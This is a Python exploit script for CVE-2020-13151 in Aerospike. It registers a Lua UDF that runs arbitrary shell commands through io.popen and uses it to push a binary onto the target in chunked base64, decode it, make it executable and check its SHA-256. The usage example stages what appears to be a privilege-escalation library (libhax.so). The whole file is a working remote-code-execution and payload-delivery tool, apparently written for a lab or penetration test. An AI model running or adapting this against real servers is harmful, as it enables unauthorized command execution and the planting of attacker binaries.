#!/usr/bin/env python3
"""Upload a binary to the Aerospike target over the UDF channel (CVE-2020-13151).

No egress on an allowlisted port, no compiler, no `wget` — the database socket that
gave code execution is also the file transport. The file goes up as chunked base64,
is decoded on the target, and the target's own `sha256sum` is compared with the local
hash: a round-trip match is the proof that the bytes survived.

    AHOST=192.168.152.143 python3 poc_aerospike_upload.py \
      --local /tmp/screen_poc/libhax.so --remote /tmp/screenroot/libhax.so --mode 755

Why chunks: one `apply()` blocks a server thread, and every policy timeout in the
client is counted per call. 3000 base64 characters per `printf` keeps each call short
while still moving a 14 KB shared object in seven round trips.

Why the parent directory is created first: a `printf >> dir/file` whose directory does
not exist fails quietly, and the final `base64 -d` then reports an empty hash. That
looks like an empty file, not a missing directory.
"""
import argparse
import base64
import hashlib
import os
import random
import re
import shutil
import string
import sys
import tempfile

import aerospike

UDF_SRC = """function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end
"""

UDF_NAME = "aero_upload.lua"
MODULE = "aero_upload"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--local", required=True, help="file on the attacker to send")
    ap.add_argument("--remote", required=True, help="absolute path to write on the target")
    ap.add_argument("--mode", default="755", help="chmod applied on the target (default 755)")
    ap.add_argument("--host", default=os.environ.get("AHOST", "192.168.150.143"))
    ap.add_argument("--port", type=int, default=int(os.environ.get("APORT", "3000")))
    ap.add_argument("--namespace", default=os.environ.get("ANAMESPACE", "test"))
    ap.add_argument("--setname", default=os.environ.get("ASET", "cve202013151"))
    ap.add_argument("--chunk", type=int, default=3000,
                    help="base64 characters per call (default 3000)")
    ap.add_argument("--timeout", type=int, default=25000, help="per-call timeout in ms")
    args = ap.parse_args()

    data = open(args.local, "rb").read()
    local_hash = hashlib.sha256(data).hexdigest()
    b64 = base64.b64encode(data).decode()
    print(f"[+] uploading {args.local} ({len(data)} bytes) -> {args.remote}")
    print(f"[+] local sha256 {local_hash}")

    # The client drops a copy of the UDF named after its basename in the current
    # directory, so register it from a temp dir.
    workdir = tempfile.mkdtemp(prefix="aero_upload_")
    udf_path = os.path.join(workdir, UDF_NAME)
    with open(udf_path, "w", encoding="utf-8") as fh:
        fh.write(UDF_SRC)

    client = aerospike.client(
        {
            "hosts": [(args.host, args.port)],
            "policies": {
                "timeout": args.timeout,
                "total_timeout": args.timeout,
                "socket_timeout": args.timeout,
            },
        }
    ).connect()

    key = "".join(random.choice(string.ascii_lowercase) for _ in range(16))
    cwd = os.getcwd()
    try:
        client.put((args.namespace, args.setname, key), {"pk": key})
        os.chdir(workdir)
        client.udf_put(udf_path)
        os.chdir(cwd)

        def run(cmd):
            """One UDF call; stderr folded into stdout so failures are visible."""
            result = client.apply(
                (args.namespace, args.setname, key), MODULE, "runCMD", [cmd + " 2>&1"]
            )
            code, value = result if isinstance(result, tuple) else (0, result)
            return (value or "").strip()

        def clean(text):
            """Drop loader noise from a host that has a broken /etc/ld.so.preload.

            Such a host prefixes the output of *every* dynamic binary with
            'ERROR: ld.so: object ... ignored.' — harmless, but it lands in front of
            whatever we actually asked for, so nothing may be parsed positionally.
            """
            return "\n".join(
                ln for ln in text.splitlines()
                if not ln.startswith("ERROR: ld.so:") and "cannot be preloaded" not in ln
            ).strip()

        def must(cmd, what):
            out = clean(run(cmd))
            if out:
                print(f"[!] {what}: {out}")
            return out

        tmp = args.remote + ".b64"
        parent = os.path.dirname(args.remote) or "/"
        must(f"mkdir -p '{parent}'", "mkdir")
        must(f"rm -f '{tmp}'", "rm")

        sent = 0
        total = len(b64)
        for off in range(0, total, args.chunk):
            piece = b64[off:off + args.chunk]
            out = clean(run(f"printf '%s' '{piece}' >> '{tmp}'"))
            if out:
                # printf writes no output on success; anything here is a real error.
                print(f"[!] chunk at {off}: {out}")
            sent += len(piece)
            print(f"    {sent}/{total} b64 chars", end="\r" if sent < total else "\n")

        out = clean(run(
            f"base64 -d '{tmp}' > '{args.remote}' && rm -f '{tmp}' "
            f"&& chmod {args.mode} '{args.remote}' && sha256sum '{args.remote}'"
        ))
        print(f"    sent {sent} b64 chars")

        # Find the digest by pattern, never by position: a host with a broken
        # ld.so.preload prepends loader warnings to this very output.
        found = re.findall(r"\b[0-9a-f]{64}\b", out)
        remote_hash = found[-1] if found else ""
        print(f"[+] remote: {out}")
        if remote_hash == local_hash:
            print("[+] hash match — the file arrived intact")
            sys.exit(0)

        print(f"[!] hash mismatch: remote {remote_hash or '(empty)'} != local {local_hash}")
        print("[!] an empty hash usually means the staging directory did not exist")
        sys.exit(1)
    finally:
        os.chdir(cwd)
        client.close()
        shutil.rmtree(workdir, ignore_errors=True)


if __name__ == "__main__":
    main()
